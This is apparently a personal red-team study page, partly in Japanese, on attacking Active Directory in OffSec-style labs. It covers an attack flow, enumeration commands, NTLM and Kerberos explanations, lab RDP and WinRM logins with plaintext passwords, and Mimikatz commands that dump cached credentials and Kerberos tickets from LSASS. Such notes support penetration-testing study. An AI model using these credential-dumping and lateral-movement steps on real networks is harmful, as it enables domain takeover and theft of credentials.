---
title: Active Directory
parent: Red Team
nav_order: 7
has_children: true
---
# Goal

## DC Administrator or Domain Admins Member

- Obtain Domain Admin privileges
- Abuse Active Directory misconfigurations
- Reuse Kerberos tickets / hashes
- Pivot across domain systems

---

# Attack Flow

## 1st Machine

1. Initial foothold in Domain PC
2. → Enumeration / Discovery
3. → Local Privilege Escalation
4. → Searching for Domain User Information
5. → Lateral Movement

## 2nd Machine
1. → Domain Pivot
2. → Enumeration / Discovery
3. → Local Privilege Escalation
4. → Searching for Domain Admins Information
5. → Lateral Movement

## Last Machine
1. → Domain lateral
2. → Persistence

---
# *Initial Foothold*
---
<details markdown="1">
<summary>RDP</summary>
## RDP

```zsh
xfreerdp3 /cert:ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.158.75 /dynamic-resolution 
```
- /pth:NTLMHash


</details>

<details markdown="1">
<summary>Win-RM</summary>
## Win-RM

```bash
evil-winrm -i 192.168.121.96 -u Eric.Wallows -p EricLikesRunning800
```

</details>


<details markdown="1">
<summary>Impacket-*</summary>



</details>

---
# *最終的な目標を明確化する*
---

## BloodHoundでDomain Adminsのユーザを検索

👉Check:
- Domain Admins User
- GenericALL
- WriteAble

![](../../assets/images/Pasted%20image%2020260523103114.png)

## ユーザとグループを列挙する
Local

```powershell
net user
```

```powershell
net localgroup
```

Domain

```powershell
net user /domain
```

```powershell
net group /domain
```

```powershell
impacket-GetADUsers -all oscp.exam/r.andrews:BusyofficeWorker890 -dc-ip 172.16.x.200
```

---
# *Enumeration for Local Privilege Escalation*
---
<details markdown="1">
<summary>Automation</summary>

## [Winpeas](../tools/windows_privilege/winpeas)

## PowerUp

</details>


<details markdown="1">
<summary>Manual</summary>
  
# ユーザ情報の確認

## 権限

```powershell
whoami /priv
```

## Group

```powershell
whoami /groups
```

## powershell history

```powershell
Get-History
```

```powershell
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

# 環境の確認
## env

```cmd
set
```

```powershell
Get-ChildItem env:
```

👉Check:
- Comment
- Password memo

## Cドライブ直下のファイル/ディレクトリ

👉Check:
- C:\automation
- C:\Windows\Log\task.bat -> memo


</details>

---
# *Enumeration for  Domain*
---

[PowerView](../tools/active_directory/Powerview.ps1.md)
*調査を進めやすくするため最初にインポートしておく*

## Domain Userの列挙
[kerbrute](../03_services/kerberos)

👉Check:
- Domain Admins User
- 特徴的なユーザ名

👉If:
- Valid Account -> [AS-REP Roasting](../07_active_directory/Attacks_on_AD_authentication/AS-REP_Roasting)


## SPNの列挙

```zsh
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

👉Check:

👉If:
- SPN detected? → [Kerberoast](../07_active_directory/Attacks_on_AD_authentication/Kerberoasting) candidate
## オブジェクト権限の列挙

👉Check:
👉If:

## ユーザーがその端末にログインしているかの列挙

👉Check:
- Domain Admins Userもしくはそこにつながるユーザの認証情報のキャッシュやメモなどを探す

[PsLoggedOn.exe](../tools/PsLoggedOn.exe.md)

👉If:

---

##  Attack on AD Authentication

<details markdown="1">
<summary>AD Authentication Works Summary</summary>

### NTLM認証
- クライアントがホスト名ではなくIPアドレスでサーバーに認証する場合、またはユーザーがActive Directory統合DNSサーバーに登録されていないホスト名で認証しようとする場合
- サードパーティ製アプリケーションはKerberos認証ではなくNTLM認証を使用することを選択できる
- NTLM認証プロトコルは7つのステップで構成される
1. コンピュータはユーザーのパスワードからNTLMハッシュと呼ばれる暗号化ハッシュを計算します。
2. 次に、クライアントコンピュータはユーザー名をサーバーに送信し、サーバーはノンスまたはチャレンジと呼ばれるランダムな値を返します。
3. クライアントは、このノンスをNTLMハッシュ（ レスポンスと呼ばれる）を使用して暗号化し、サーバーに送信します。
4. サーバーは、ユーザー名とノンス（nonce）を含むレスポンスをドメインコントローラに転送します。
5. ドメインコントローラは既に全ユーザーのNTLMハッシュを把握しているため、検証を実行します。
6. ドメインコントローラは、提供されたユーザー名のNTLMハッシュでノンス自体を暗号化し、サーバーから受信したレスポンスと比較します。
7. 両者が一致した場合、認証要求は成功となります。

![](../../../../images/Pasted%20image%2020260523052755.png)

---

### Kerberos認証

- Active Directoryおよび関連サービスのデフォルトの認証プロトコル
- MITが開発
- Kerberos認証はチケットシステムを使用
- DCがキー配布センター（KDC）の役割を果たします
- KDCサービスは各DC上で実行され、ユーザーとコンピューターへのセッションチケットと一時セッションキーを管理
- プロセスの詳細
1. ユーザーがワークステーションにログインすると、認証サーバー要求（AS-REQ）がDCに送信されます。DCはKDCとして機能し、認証サーバーサービスも管理します。AS-REQには、ユーザーのパスワード とユーザー名から生成されたハッシュ を使用して暗号化されたタイムスタンプが含まれています。

2. ドメインコントローラは要求を受信すると、 ntds.ditファイル内の特定のユーザーに関連付けられたパスワードハッシュを参照し、タイムスタンプの復号を試みます。復号プロセスが成功し、タイムスタンプが重複していない場合、認証は成功したとみなされます。

タイムスタンプが重複している場合は、潜在的なリプレイ攻撃の証拠を示している可能性があります。
3. 次に、ドメインコントローラは認証サーバー応答（AS-REP）でクライアントに応答します 。Kerberosはステートレスプロトコルであるため、AS-REPにはセッションキーとチケット保証チケット（TGT）が含まれます。セッションキーはユーザーのパスワードハッシュを使用して暗号化され、クライアントによって復号化されて再利用できます。TGTには、ユーザー、ドメイン、タイムスタンプ、クライアントのIPアドレス、そしてセッションキーに関する情報が含まれています。

改ざんを防ぐため、TGTはKDCのみが知る秘密鍵（krbtgtアカウントのNTLMハッシュ）で暗号化され、クライアントでは復号できません。クライアントがセッションキーとTGTを受信すると、KDCはクライアント認証が完了したとみなします。デフォルトでは、TGTの有効期間は10時間で、その後更新が行われます。この更新時にユーザーはパスワードを再入力する必要はありません。

ユーザーがネットワーク共有やメールボックスなどのドメインのリソースにアクセスする場合、再度 KDC に接続する必要があります。

今回は、クライアントは 、現在のユーザーとセッション キーで暗号化されたタイムスタンプ、リソースの名前、および暗号化された TGT で構成されるチケット保証サービス要求(TGS-REQ) パケットを構築します。

4. 次に、KDCのチケット交付サービス（TGS-REQ）がTGS-REQを受信し、リソースがドメイン内に存在する場合、KDCのみが知っている秘密鍵を用いてTGTが復号されます。その後、TGTからセッション鍵が抽出され、リクエストのユーザー名とタイムスタンプが復号されます。この時点で、KDCはいくつかのチェックを実行します。

TGT には有効なタイムスタンプが必要です。
TGS-REQ のユーザー名は TGT のユーザー名と一致する必要があります。
クライアント IP アドレスは TGT IP アドレスと一致する必要があります。
この検証プロセスが成功すると、チケット認可サービスはクライアントにチケット認可サーバー応答 （TGS-REP）を送信します。このパケットは3つの部分で構成されます。

アクセスが許可されたサービスの名前。
クライアントとサービス間で使用されるセッション キー。
ユーザー名とグループ メンバーシップ、および新しく作成されたセッション キーを含むサービス チケット。
サービスチケットのサービス名とセッションキーは、TGTの作成時に関連付けられた元のセッションキーを使用して暗号化されます。サービスチケットは、該当するサービスに登録されているサービスアカウントのパスワードハッシュを使用して暗号化されます。

KDC による認証プロセスが完了し、クライアントがセッション キーとサービス チケットの両方を取得すると、サービス認証が開始されます。

まず、クライアントはアプリケーション サーバーにアプリケーション要求(AP-REQ) を送信します。この要求には、ユーザー名、サービス チケットに関連付けられたセッション キーで暗号化されたタイムスタンプ、およびサービス チケット自体が含まれます。

アプリケーションサーバーは、サービスアカウントのパスワードハッシュを使用してサービスチケットを復号化し、ユーザー名とセッションキーを抽出します。
次に、セッションキーを使用してAP-REQからユーザー名を復号します。
AP -REQのユーザー名がサービスチケットから復号されたユーザー名と一致する場合、要求は承認されます。アクセスを許可する前に、サービスはサービスチケットに指定されたグループメンバーシップを検査し、ユーザーに適切な権限を割り当てます。
その後、ユーザーは要求されたサービスにアクセスできるようになります。

このプロトコルは複雑で、おそらくは入り組んでいるように見えるかもしれませんが、さまざまなネットワーク攻撃を軽減し、偽の資格情報の使用を防ぐために設計されています。

---

### キャッシュされたAD資格情報

- LSASSプロセスはオペレーティングシステムの一部であり、SYSTEMとして実行されるため、ターゲットに保存されているハッシュにアクセスするには、SYSTEM（またはローカル管理者）権限が必要
- Mimikatzなどのツールによるハッシュ抽出を防ぐ効果的な防御策の一つは、LSA保護機能を追加することです。LSAにはLSASSプロセスが含まれています。レジストリキーを設定することで、Windowsはこのプロセスによるメモリの読み取りをブロックします。OffSecの 「回避技術と侵入防御」コース「PEN-300」では、この保護機能をはじめとする強力な防御メカニズムを回避する方法について詳しく説明します。
### キャッシュされた認証ハッシュの抽出
#### 接続

```bash
xfreerdp3 /cert:ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.206.75 /dynamic-resolution
```

### mimikatzの準備
管理者としてpowershellを起動
#Terminal01
```powershell
cd C:\Tools
.\mimikatz.exe
privilege::debug
```

### ログオンしているすべてのユーザーの資格情報をダンプ
```powershell
sekurlsa::logonpasswords
```
キャッシュされたハッシュを含む、ドメイン ユーザーjeffおよびdaveの LSASS に保存されているすべての資格情報が表示されます。

## キャッシュされたサービスチケットの取得
#Terminal02 
### チケットのキャッシュ

```powershell
dir \\web04.corp.com\backup
```

```powershell
sekurlsa::tickets
```

```
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
-----
```
出力にはTGTとTGSの両方が表示されます。TGSを盗めば、そのチケットに関連付けられた特定のリソースにのみアクセスできるようになります。あるいは、TGTがあれば、ドメイン内の特定のリソースに対してTGSを要求することもできます。

---
## 秘密鍵を含む証明書をエクスポートする方法
crypto モジュールに は、 CryptoAPI 関数に crypto::capiを適用するか 、KeyIsoサービスに crypto::cng を適用して、エクスポートできない鍵をエクスポート可能にする 機能 が含まれています。

</details>

[AS-REP_Roasting](Attacks_on_AD_authentication/AS-REP_Roasting.md)
 
[Kerberoasting](Attacks_on_AD_authentication/Kerberoasting.md)

[Password Spray Attack](Attacks_on_AD_authentication/Password(Spray)Attack.md)

[DC Sync](Attacks_on_AD_authentication/DC_Synchronization)

[Golden Ticket](Attacks_on_AD_authentication/Golden_Ticket)

[Silver Ticket](Attacks_on_AD_authentication/Silver_Ticket.md)

---
# *Lateral Movement*

---

<details markdown="1">
<summary>RDP</summary>
## RDP

```zsh
xfreerdp3 /cert:ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.158.75 /dynamic-resolution 
```
- /pth:NTLMHash


</details>

<details markdown="1">
<summary>Win-RM</summary>
## Win-RM

```bash
evil-winrm -i 192.168.121.96 -u Eric.Wallows -p EricLikesRunning800
```

</details>


<details markdown="1">
<summary>Impacket-*</summary>



</details>

---
# *Persistentce*

---